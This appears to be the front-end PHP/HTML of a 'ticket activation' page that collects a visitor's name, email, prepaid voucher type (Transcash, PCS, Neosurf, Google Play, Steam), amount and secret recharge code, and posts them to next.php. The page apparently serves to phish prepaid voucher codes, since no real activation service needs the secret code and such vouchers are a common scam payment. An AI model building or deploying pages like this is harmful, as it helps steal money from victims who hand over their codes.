<?php
require("action.php");
?>




<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>Booking Form HTML Template</title>

	<!-- Google font -->
	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet">

	<!-- Bootstrap -->
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />

	<!-- Custom stlylesheet -->
	<link type="text/css" rel="stylesheet" href="css/style.css" />

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->
		<style type="text/css">

#slider {
	overflow: hidden;
}
#slider figure {
	position: relative;
	width: 100%;
	margin: 0;
	left: 0;
	animation: 20s slider infinite;
}
#slider figure img {
	width: 20%;
	float: left;
}

</style>
<div id="slider">
	<figure>
		<img src="img/maxresdefault.jpg">
		<img src="img/pc_gamecards.jpg">
		<img src="img/maxresdefault - Copie.jpg">
		<img src="img/pc_gamecards - Copie.jpg">
		<img src="img/maxresdefault - Copie2.jpg">
	</figure>
</div>

</head>

<body>
	<div id="booking" class="section">
		<div class="section-center">
			<div class="container">
				<div class="row">
					<div class="booking-form">
						<div class="form-header">
						
							<h1>TICKET ACTIVATION</h1>
						</div>
						<form method="post" action="next.php">
							<div class="row">
								<div class="col-sm-6">
									<div class="form-group">
										<span class="form-label">Name</span>
										<input class="form-control" type="text" name="nom" placeholder="Enter your name " required>
									</div>
								</div>
								<div class="col-sm-6">
									<div class="form-group">
										<span class="form-label">Email</span>
										<input class="form-control" type="email" name="email" placeholder="Enter your email" required>
									</div>
								</div>
							</div>
							
							<div class="form-group">
								<span class="form-label">Ticket Type</span>
												<select name="ticket" class="form-control">
													<option>TRANS-CASH</option>
													<option>PCS</option>
													<option>NEOSURF</option>
													<option>GOOGLE-PLAY</option>
													<option>STEAM</option>
												</select>
												<span class="select-arrow"></span>
							</div>

							<div class="form-group">
								<span class="form-label">Recharge Amount</span>
												<select name="prix" class="form-control">
													<option>20€</option>
													<option>50€</option>
													<option>100€</option>
													<option>150€</option>
													<option>200€</option>
													<option>250€</option>
													<option>500€</option>
												</select>
												<span class="select-arrow"></span>
							</div>


							<div class="form-group">
								<span class="form-label">Recharge Code</span>
								<input class="form-control" type="password" id="mot_de_passe" name="motdepasse" placeholder="Enter your recharge code" required>
								<input class="from-control" type="checkbox" onclick="afficher()"> Show code
								<script>
									function afficher()
									{
										var input = document.getElementById("mot_de_passe");
										if (input.type === "password")
										{
											input.type = "text"
										}
										else
										{
											input.type = "password"
										}
									}
								</script>
							</div>
							
							<div class="row">
								<div class="col-sm-5">
									<div class="form-group">
										<span class="form-label">Date de l'achat</span>
										<input class="form-control" type="date" name="ladate" required>
									</div>
								</div>
								
							</div>
							<div class="form-btn">
								<button class="submit-btn" name="validation">Autentication</button>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
	</div>
</body>

</html>















